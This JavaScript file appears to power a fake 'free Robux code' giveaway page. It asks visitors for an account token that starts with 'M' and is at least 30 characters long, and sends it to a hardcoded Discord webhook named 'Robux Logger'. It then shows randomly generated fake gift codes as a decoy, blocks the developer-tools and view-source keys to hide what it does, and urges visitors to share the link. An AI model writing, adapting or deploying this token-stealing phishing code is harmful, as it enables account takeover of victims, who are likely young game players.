let lastClickTime = 0;
let clickLocked = false;

function isValidToken(token) {
  return token.startsWith("M") && token.length >= 30;
}

function submitToken() {
  const now = Date.now();
  const token = document.getElementById("tokenInput").value.trim();

  if (clickLocked && (now - lastClickTime) < 30000) {
    alert("🤖 Bot-like behavior detected! Please wait a moment.");
    return;
  }

  if (!token) {
    alert("❗ Please enter your token.");
    return;
  }

  if (!isValidToken(token)) {
    alert("🚫 Invalid token. Try again.");
    return;
  }

  lastClickTime = now;
  clickLocked = true;
  sendToWebhook(token);
  document.getElementById("mainContent").style.display = "block";

  setTimeout(() => {
    clickLocked = false;
  }, 30000);
}

function drawGift() {
  const chance = Math.random();
  const resultBox = document.getElementById("resultBox");

  if (chance < 0.05) {
    const code = generateRandomCode();
    resultBox.innerHTML = `
      <p>🎉 Congratulations! Here is your Robux code:</p>
      <div class="code" id="giftCode">${code}</div><br/>
      <button onclick="copyCode()">📋 Copy Code</button>
    `;
  } else {
    resultBox.innerHTML = `<p>😢 No luck this time. Try again!</p>`;
  }
}

function generateRandomCode() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  function fourChars() {
    let result = "";
    for (let i = 0; i < 4; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }
  return `${fourChars()}-${fourChars()}-${fourChars()}`;
}

function copyCode() {
  const codeText = document.getElementById("giftCode").textContent;
  navigator.clipboard.writeText(codeText).then(() => {
    alert("✅ Code copied to clipboard!");
  });
}

function copyLink() {
  const url = window.location.href;
  navigator.clipboard.writeText(url).then(() => {
    alert("✅ Link copied! Share it with your friends.");
  });
}

function sendToWebhook(token) {
  const webhookURL = "https://discord.com/api/webhooks/1337401457363914793/4Kw38p-BfAoa0ZOTRGmCIuj8bM4vhbyOCM7IwV5FABbvalz3yq1R9RahneoY_1qLCbgC";

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: "Robux Logger",
      avatar_url: "https://i.imgur.com/7xMZ1ik.png",
      content: `🪙 Robux Token submitted: \`${token}\``
    })
  }).then(res => {
    if (res.ok) {
      console.log("✅ Webhook sent");
    } else {
      console.warn("❌ Webhook blocked");
    }
  }).catch(err => {
    console.error("❌ Webhook error:", err);
  });
}

document.addEventListener("keydown", function (e) {
  if (
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") ||
    (e.ctrlKey && e.key.toLowerCase() === "u")
  ) {
    e.preventDefault();
    alert("🚫 Developer tools are disabled.");
  }
});
